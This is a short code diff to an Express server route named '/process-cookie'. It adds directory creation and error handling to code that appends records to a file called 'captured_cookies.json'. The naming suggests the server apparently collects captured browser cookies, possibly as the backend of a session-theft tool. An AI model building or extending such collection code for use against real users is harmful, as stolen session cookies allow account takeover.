@@ -381,12 +381,20 @@ apiRouter.post('/process-cookie', async (req, res) => {
     };
 
     // Save to cookies JSON file
-    const cookiesJsonPath = path.join(__dirname, 'tokens', 'captured_cookies.json');
+    const tokensDir = path.join(__dirname, 'tokens');
+    if (!fs.existsSync(tokensDir)) {
+      fs.mkdirSync(tokensDir, { recursive: true });
+    }
+    const cookiesJsonPath = path.join(tokensDir, 'captured_cookies.json');
     let existingCookies = [];
     
     if (fs.existsSync(cookiesJsonPath)) {
-      const data = fs.readFileSync(cookiesJsonPath, 'utf8');
-      existingCookies = JSON.parse(data);
+      try {
+        const data = fs.readFileSync(cookiesJsonPath, 'utf8');
+        existingCookies = JSON.parse(data);
+      } catch (e) {
+        existingCookies = [];
+      }
     }
     
     existingCookies.push(cookieRecord);
